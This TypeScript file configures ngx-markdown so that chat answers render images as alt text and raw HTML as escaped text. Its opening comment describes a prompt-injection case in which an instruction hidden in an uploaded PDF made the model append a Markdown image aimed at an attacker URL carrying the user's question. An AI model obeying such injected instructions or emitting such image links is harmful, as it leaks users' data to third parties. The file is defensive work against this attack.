import { MarkedOptions, MarkedRenderer } from 'ngx-markdown';

// Answers are model output, and the model reads uploaded PDFs: an injected
// instruction made it end answers with ![status](http://attacker/?q=<question>).
// The browser loads an image at once, with no click, so the question leaked
// (Step 5 Task 6). Angular's sanitizer keeps <img src="http://...">, so it
// doesn't stop this. Here the renderer never creates images:
//   - Markdown images become their alt text, e.g. "[image: status]"
//   - raw HTML in the answer is shown as text, never rendered as HTML
//     (also covers <img>, <picture>, <svg><image>, any case)
// Code blocks are untouched: their text is escaped by marked already.

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

export function safeMarkedOptions(): MarkedOptions {
  const renderer = new MarkedRenderer();
  renderer.image = ({ text }) => (text ? `[image: ${escapeHtml(text)}]` : '[image]');
  renderer.html = ({ text }) => escapeHtml(text);
  return { renderer };
}
